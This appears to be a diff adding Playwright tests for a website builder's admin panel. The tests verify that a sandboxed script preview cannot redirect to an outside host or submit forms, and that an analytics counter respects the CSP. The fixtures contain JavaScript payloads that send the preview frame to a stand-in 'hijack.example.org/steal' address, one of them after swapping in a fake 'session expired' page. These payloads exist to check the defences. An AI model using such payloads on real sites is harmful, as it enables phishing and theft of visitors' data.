@@ -262,6 +262,107 @@ test('предпросмотр со скриптом изолирован: ни 
   await expect(page.getByRole('heading', { level: 1, name: 'Карточки' })).toBeVisible()
 })
 
+// Рамку не пускает на чужой адрес сам браузер: frame-src в CSP админки (index.html) действует и на
+// переход, который начала рамка. Запрос не уходит ни при задержке, ни сразу, ни после
+// document.open() (он стирает обработчики документа, поэтому сообщение об уходе не помогло бы)
+const HIJACKS = {
+  'с задержкой': {
+    code: "setTimeout(() => { location.href = 'https://hijack.example.org/steal?x=1' }, 50)",
+    keeps: true,
+  },
+  сразу: { code: "location.href = 'https://hijack.example.org/steal?x=1'", keeps: true },
+  'после document.open()': {
+    code: `document.open()
+document.write('<h1>Сессия истекла</h1>')
+setTimeout(() => { location.href = 'https://hijack.example.org/steal?x=1' }, 50)`,
+    keeps: false,
+  },
+}
+for (const [when, { code, keeps }] of Object.entries(HIJACKS)) {
+  test(`скрипт в рамке предпросмотра не уводит её на чужой адрес ${when}: запроса нет`, async ({
+    page,
+    demoSite,
+  }) => {
+    await createBlock(demoSite.id, code)
+    const asked: string[] = []
+    await page.route(/^https:\/\/hijack\.example\.org\//, (route) => {
+      asked.push(route.request().url())
+      return route.fulfill({
+        status: 200,
+        contentType: 'text/html',
+        body: '<h1>чужая страница</h1>',
+      })
+    })
+    await page.goto(`/blocks/${KEY}`)
+    await expect(page.getByRole('heading', { level: 1, name: 'Карточки' })).toBeVisible()
+    await page.getByRole('checkbox', { name: 'Выполнять скрипт' }).check()
+    const frame = page.frameLocator('iframe[data-sandbox-preview]')
+    if (keeps) await expect(frame.getByRole('heading', { name: 'Карточки' })).toBeVisible()
+    else await expect(frame.getByRole('heading', { name: 'Сессия истекла' })).toBeVisible()
+    // Времени с запасом: переход и запрос уходят сразу, а не через секунды
+    await page.waitForTimeout(800)
+    expect(asked).toEqual([])
+    await expect(frame.getByText('чужая страница')).toHaveCount(0)
+    await expect(page).toHaveURL(new RegExp(`/blocks/${KEY}$`))
+  })
+}
+
+test('форма главной в предпросмотре со скриптом не отправляется: ни одного POST', async ({
+  page,
+  demoSite,
+}) => {
+  // Главная с формой: свой блок нужен только затем, чтобы placeBlock собрал страницу
+  await createBlock(demoSite.id, '')
+  await placeBlock(demoSite.id, [{ id: 'form-1', type: 'form', props: form.example }])
+  const posts: string[] = []
+  page.on('request', (request) => {
+    if (request.method() === 'POST') posts.push(request.url())
+  })
+  await page.goto('/script')
+  await expect(page.getByRole('heading', { level: 1, name: 'Скрипт сайта' })).toBeVisible()
+  await page.getByRole('textbox', { name: 'Скрипт', exact: true }).fill(
+    `setTimeout(() => {
+  const form = document.querySelector('form')
+  document.body.dataset.formTried = form ? 'yes' : 'no'
+  form?.submit()
+}, 100)`,
+  )
+  await page.getByRole('checkbox', { name: 'Выполнять скрипты' }).check()
+  const body = page.frameLocator('iframe[data-sandbox-preview]').locator('body[data-form-tried]')
+  await expect(body).toHaveAttribute('data-form-tried', 'yes')
+  await page.waitForTimeout(800)
+  expect(posts).toEqual([])
+})
+
+test('Метрика в режиме «только уведомление»: счётчик подключён файлом, inline нет, CSP не нарушена', async ({
+  page,
+  demoSite,
+}) => {
+  const saved = await sites[':siteId'].settings.$patch({
+    param: { siteId: demoSite.id },
+    json: { analytics: { metrika: '98765432' }, cookies: { mode: 'notice' } },
+  })
+  expect(saved.status, await saved.clone().text()).toBe(200)
+  const requested: string[] = []
+  await page.route(/^https:\/\/mc\.yandex\.ru\//, (route) => {
+    requested.push(route.request().url())
+    return route.fulfill({ status: 200, contentType: 'text/javascript', body: '' })
+  })
+  const violations: string[] = []
+  page.on('console', (message) => {
+    if (/Content Security Policy/.test(message.text())) violations.push(message.text())
+  })
+  const response = await page.goto(urls.renderer)
+  expect(response?.headers()['content-security-policy']).toContain('https://mc.yandex.ru')
+  await expect(page.locator('script[src="https://mc.yandex.ru/metrika/tag.js"]')).toHaveCount(1)
+  expect(requested.some((url) => url.startsWith('https://mc.yandex.ru/metrika/tag.js'))).toBe(true)
+  const scripts = await scriptsOf(page)
+  expect(
+    scripts.filter((src) => src.startsWith('inline:') && src !== 'inline:application/ld+json'),
+  ).toEqual([])
+  expect(violations).toEqual([])
+})
+
 test('скрипт сайта в админке: черновик → предпросмотр со скриптом → публикация', async ({
   page,
 }, testInfo) => {
